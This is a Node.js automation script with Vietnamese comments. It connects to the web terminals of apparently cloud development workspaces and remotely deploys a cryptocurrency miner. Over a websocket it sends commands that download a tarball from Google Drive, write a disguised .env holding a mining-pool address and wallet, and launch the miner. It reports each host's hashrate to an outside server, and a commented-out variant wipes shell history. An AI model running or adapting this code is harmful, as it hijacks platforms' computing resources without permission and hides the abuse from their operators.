const path = require('path');
const crypto = require('crypto');
const argv = require('minimist')(process.argv.slice(2));
const puppeteer = require('puppeteer-extra');
const fs = require('fs');
const EventEmitter = require('events');
const fetch = require('node-fetch');
const WebSocket = require('ws');
const blessed = require('blessed');
const pidusage = require('pidusage');
const os = require("os");
const axios = require("axios");
const { exec } = require("child_process");

// // ==== Tạo LOCK FILE để tránh chạy trùng ====
// const LOCK_DIR = os.platform() === "win32" ? "C:\\Temp" : "/tmp";
// const LOCK_FILE = path.join(LOCK_DIR, "statsRunner.lock");

// try {
//   fs.writeFileSync(LOCK_FILE, process.pid.toString(), { flag: "wx" });
//   console.log("✅ Đang chạy tiến trình với PID:", process.pid);
// } catch (err) {
//   console.error("❌ File đang bị chạy trùng! Đã có tiến trình khác.");
//   process.exit(1);
// }

// function cleanup() {
//   try {
//     fs.unlinkSync(LOCK_FILE);
//     console.log("Đã dọn dẹp lock file.");
//   } catch {}
//   process.exit(0);
// }
// process.on("SIGINT", cleanup);
// process.on("SIGTERM", cleanup);
// process.on("exit", cleanup);


const BASE_DIR = __dirname;
const ST_FILE = path.join(BASE_DIR, "python-app/stdout.txt");
// const ST_FILE = path.join(BASE_DIR, "micro-rinc/stdout.txt");
// function findFile(startDir, targetFile) {
//   let result = null;
//   function searchDir(dir) {
//       const files = fs.readdirSync(dir, { withFileTypes: true });
//       for (const file of files) {
//           const fullPath = path.join(dir, file.name);
//           if (file.isDirectory()) {
//               try {
//                   result = searchDir(fullPath);
//                   if (result) return result;
//               } catch (_) { }
//           } else if (file.name === targetFile && fullPath.includes("micro-rinc")) {
//               return fullPath;
//           }
//       }
//       return null;
//   }
//   return searchDir(startDir);
// }

// const ST_FILE = findFile("/", "stdout.txt");

function cleanText(text) {
    return text.replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '');
}

function extractLastProcessing(text) {
    const regex = /PROCESSING\.\.\..*?U\/s/g;
    const matches = text.match(regex);
    if (!matches || matches.length === 0) return "Không tìm thấy đoạn PROCESSING... đến U/s";
    return matches[matches.length - 1];
}

// function extractLastProcessing(text) {
//     const lines = text.split(/\r?\n/).filter(line => line.includes("STATUS") && line.includes("U/s"));
//     if (lines.length === 0) return "Không tìm thấy dòng chứa STATUS... đến U/s";
    
//     const lastLine = lines[lines.length - 1];
//     return cleanText(lastLine).trim();
// }

function processFile() {
    try {
        if (!fs.existsSync(ST_FILE)) return "File không tồn tại";

        const lines = fs.readFileSync(ST_FILE, "utf-8").split(/\r?\n/).filter(Boolean);
        if (lines.length === 0) return "No Data";

        const lastProcessingLine = [...lines].reverse().find(line => line.includes("PROCESSING"));
        if (!lastProcessingLine) return "No Data";

        const cleaned = cleanText(lastProcessingLine);
        const match = /\d+\.\d+\sU\/s/.test(cleaned);
        if (match) {
            return extractLastProcessing(cleaned);
        } else {
            return "Không tìm thấy tốc độ U/s trong phần cuối cùng.";
        }

    } catch (err) {
        console.error("Lỗi trong processFile:", err);
        return "Có lỗi xảy ra trong việc xử lý file.";
    }
}

// function processFile() {
//     try {
//         if (!fs.existsSync(ST_FILE)) return "File không tồn tại";

//         const content = fs.readFileSync(ST_FILE, "utf-8");
//         return extractLastProcessing(content);
//     } catch (err) {
//         //console.error("Lỗi trong processFile:", err);
//         return "Có lỗi xảy ra trong việc xử lý file.";
//     }
// }

function getWebHost(callback) {
    const cmd = os.platform() === 'win32' ? 'set' : 'printenv';
    exec(cmd, (error, stdout, stderr) => {
        if (error || stderr) {
            //console.error("Lỗi khi chạy printenv:", error || stderr);
            return callback(null);
        }

        const line = stdout.split('\n').find(line => line.startsWith('WEB_HOST='));
        if (line) {
            const host = line.split("=")[1].trim();
            return callback(host);
        } else {
            //console.log("WEB_HOST không được tìm thấy, tiếp tục tìm...");
            setTimeout(() => getWebHost(callback), 5000);
        }
    });
}
const timess = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" }).replace(",", ""); 
function startMainLoop(url) {
  const fullUrl = "https://" + url;

  async function loop() {
      let delay = 5; // mặc định nếu có lỗi thì delay 60s
      try {
          let result = "";
          try {
              result = processFile();
              //console.log("result:", result);
          } catch (e) {
              //console.error("Lỗi khi xử lý processFile:", e.message);
          }

          const now = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" }).replace(",", "");
          //console.log(`Đang gửi thông tin lên server: ${url}, ${now}, ${result}`);

          try {
              const response = await axios.get("https://up.labycoffee.com/upgmail-update.php", {
                  params: {
                      uid: url,
                      full_info: `${url}%${now}%${result}%${timess}`,
                      type: 44
                  }
              });
              const upclone_web = response.data.upclone_web;
              console.log(upclone_web);
          } catch (e) {
              //console.error("Lỗi khi gửi dữ liệu lên server:", e.message);
          }

      } catch (err) {
          //console.error("Lỗi không xác định trong vòng lặp:", err.message);
      }
  }

  loop(); // chỉ gọi 1 lần duy nhất
}


// function saveTextToJsonFile(url) {
//     const filePath = path.join(__dirname, 'urls.json');
//     const dataToSave = [[url]];

//     try {
//         fs.writeFileSync(filePath, JSON.stringify(dataToSave, null, 2), 'utf-8');
//         //console.log('✔ Đã ghi đè urls.json');
//     } catch (err) {
//         //console.error('❌ Lỗi ghi file:', err);
//     }
// }

let cachedWebHost = null;
function urlstart() {
  if (cachedWebHost) {
      const url = "8080-" + cachedWebHost;
      startMainLoop(url);
      return;
  }

  getWebHost((webHost) => {
      if (!webHost) {
          // Nếu lỗi, thử lại sau 5 giây
          return setTimeout(start, 5000);
      }

      cachedWebHost = webHost; // lưu lại để không gọi lại lần sau

      const url = "8080-" + webHost;
      startMainLoop(url);
  });
}

// Khởi động
// function start() {
//     getWebHost((webHost) => {
//         if (!webHost) {
//             //console.error("Không thể lấy WEB_HOST. Sẽ thử lại sau 5 giây...");
//             return setTimeout(start, 5000); // tự gọi lại nếu lỗi
//         }

//         const url = "8080-" + webHost;
//         //console.log("URL đã được tạo:", url);
//         // saveTextToJsonFile(url);
//         startMainLoop(url);
//     });
// }



class Client extends EventEmitter {
  profile = null;
  name = ''

  constructor(profile, name) {
    super();
    this.profile = profile;
    this.name = name;
  }

  stats = (host) => new Promise((resolve) => {
    fetch(`https://${host}`, {
      method: 'GET',
      timeout: 0,
      headers: {
        'Host': host,
        'Origin': `https://${host}`,
        'Connection': 'Upgrade',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache'
      }
    })
      .then(response => {
        return response.json();
      }
      )
      .then(() => {
        resolve(true);
      })
      .catch((error) => {
        resolve(false);
      });
  })

  startWs = async (url, host, context, uid) => {
    let interval = null;
    let interval2 = null;
    this.emit('data', { uid, message: 'Connecting to terminal...' });

    const status = await this.stats(host);
    if (!status) {
      this.emit('data', { uid, message: 'Connection closed!' });
      setTimeout(() => {
        this.startWs(url, host, context, uid);
      }, 5000);
      return;
    }

    const ws = new WebSocket(`wss://${host}/terminal`, {
      headers: {
        'Host': host,
        'Origin': `https://${host}`,
        'Connection': 'Upgrade',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'User-Agent': context.argent,
        'Upgrade': 'websocket',
        'Sec-WebSocket-Version': '13',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9,ja;q=0.8,vi;q=0.7',
        'Sec-WebSocket-Key': crypto.randomBytes(16).toString('base64'),
        'Sec-WebSocket-Extensions': 'permessage-deflate; client_max_window_bits'
      }
    });

    ws.on('open', () => {
      this.emit('data', { uid, message: 'Connected to terminal...' });

      //MBC 
      const commands = [
        "[ -f python-app/run.sh ] || wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1-yGlToIVDzEohzEejAfDfs-8BKJFtS8W&export=download&confirm=t' -O python-app-main.tar.gz && tar -xvf python-app-main.tar.gz && rm python-app-main.tar.gz",
        "cd python-app && echo -e 'proxy=wss://ws-zozo.hongphat.edu.vn/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nhost=127.0.0.1\nport=3306\nusername=RSqWRgivNtmxDaEWj1xyLrE5HPnjcs8DNj\npassword=c=RVN,zap=MBC\nthreads=8' > .env && ./run.sh 8 > stdout.txt 2> stderr.txt"
      ]
      //"cd python-app && echo -e 'proxy=wss://nop-linussbit.hongphat.edu.vn/c3RyYXR1bS1ldS5ycGxhbnQueHl6OjcwMjI=\nhost=127.0.0.1\nport=3306\nusername=mbc1qurmus3vvfe25cv6rsqgnx0ewr8qjym324m278x\npassword=webpassword=linuss\nthreads=8' > .env && ./run.sh 8 > stdout.txt 2> stderr.txt"
      
      //RIN
      // const commands = [
      //   "[ -f micro-rinc/app.js ] || wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1W8_b2kSv4ppTnDYDu9OVKuQxf1sj0eU4&export=download&confirm=t' -O micro-rinc-master.tar.gz && tar -xvf micro-rinc-master.tar.gz && rm micro-rinc-master.tar.gz",
      //   `cd micro-rinc && echo -e 'SECRET_TOKEN="MTYwLjMwLjE2OC4xOTk6NDA1MQ=="\nAUTH_USER="RSqWRgivNtmxDaEWj1xyLrE5HPnjcs8DNj"\nAUTH_PASS="Yz1SVk4="\nCONCURRENCY=8\nLOGGING_LEVEL="info"' > .env && history -c && history -w && clear && node app.js > stdout.txt 2> stderr.txt`
      //   ]
      
     

      commands.forEach((command, i) => {
        setTimeout(() => ws.send(command + '\n'), i * 1500)
      });

      // keep alive
      let interval;
      let lastStartTime = 0;

      const runStats = async () => {
        try {
          await this.stats(host);

          const now = Date.now();
          if (now - lastStartTime >= 5 * 60 * 1000) {
            try {
              urlstart();
            } catch (error) {
              console.error("Lỗi khi chạy urlstart():", error);
            }
            lastStartTime = now;
          }
        } catch (error) {
          console.error("Lỗi trong this.stats:", error);
        } finally {
          // luôn lặp lại, kể cả khi có lỗi
          interval = setTimeout(runStats, 60 * 1000);
        }
      };

      runStats();
      // const runStats = async () => {
      //   // const commands = [
      //   //   'pkill -f pypya.js || true',
      //   //   'node pypya.js'
      //   //   ]
          
      //   // commands.forEach((command, i) => {
      //   //   setTimeout(() => ws.send(command + '\n'), i * 1500)
      //   // });
      //   await this.stats(host);

      //   const now = Date.now();
      //   if (now - lastStartTime >= 5 * 60 * 1000) { // đã 5 phút chưa?
      //     try {
      //       urlstart();
      //     } catch (error) {
      //       //console.error("Lỗi khi chạy start():", error);
      //     }
      //     lastStartTime = now; // cập nhật thời gian start() gần nhất
      //   }
      //   interval = setTimeout(runStats, 60 * 1000);
      // };
      // runStats();
    });

    ws.on('message', (data) => {
      this.emit('data', { uid, message: Buffer.from(data).toString().split(/\r?\n/)[0] });
    });

    ws.on('error', (error) => {
      this.emit('data', { uid, message: 'Error: ' + error.message });

      setTimeout(() => {
        ws.close();
      }, 5000);
    });

    ws.on('close', () => {
      if (interval) {
        clearTimeout(interval);
      }
      if (interval2) {
        clearTimeout(interval2);
      }

      this.emit('data', { uid, message: 'Connection closed! Reconnecting after 5 seconds...' });
      setTimeout(() => {
        this.startWs(url, host, context, uid);
      }, 5000);
    });
  }

  start = () => {
    const profile = this.profile;
    const context = { argent: "" };
    profile.forEach((page, index) => {
      const uid = crypto.randomBytes(4).toString('hex');
      this.emit('open', { uid, index, url: page.url });
      setTimeout(() => {
        try {
          this.startWs('', page, context, uid);
        } catch (error) {
          this.emit('data', { uid, message: error.message });
        }
      }, index * 1500);
    });
  }
}

(async () => {
  const profile = argv.p || '0';
  let screen = blessed.screen({ smartCSR: true });
  const stats =  blessed.text({
    top: 0,
    left: 0,
    width: "100%",
    height: "shrink",
    content: `[ PROFILE: ${profile} | CPU: 0% | RAM: 0 MB ]`,
    style: { fg: "green" },
  });
  screen.append(stats);
  screen.render();

  const targets = JSON.parse(fs.readFileSync(path.join(__dirname, 'urls.json'), 'utf-8'));
  const name = `profile-${profile}`;
  const p = targets[Number(profile)];
  const client = new Client(p, name);

  let lines = {};
  let urls = {}

  client.on('open', ({ uid, index, url }) => {
    urls[uid] = url;
    lines[uid] = blessed.text({
      top: (2 * index) + 2,
      left: 0,
      width: "100%",
      height: "shrink",
      content: `[ ${uid} ] : Connecting`,
      style: { fg: "green" },
    });
    screen.append(lines[uid]);
    screen.render();
  });

  client.on('data', ({ uid, message }) => {
    if (lines[uid]) {
      lines[uid].setContent(`[ ${uid} ] : ${message}`);
      screen.render();
    }
  });

  client.start();

  // get info
  const getInfo = async () => {
    const s = await pidusage(process.pid);
    stats.setContent(`[ PROFILE: ${profile} | CPU: ${s.cpu.toFixed(2)}% | RAM: ${(s.memory / 1024 / 1024).toFixed(2)} MB ]`);
    screen.render();
  }
  await getInfo();
  setInterval(async () => {
    getInfo();
  }, 30000);
})();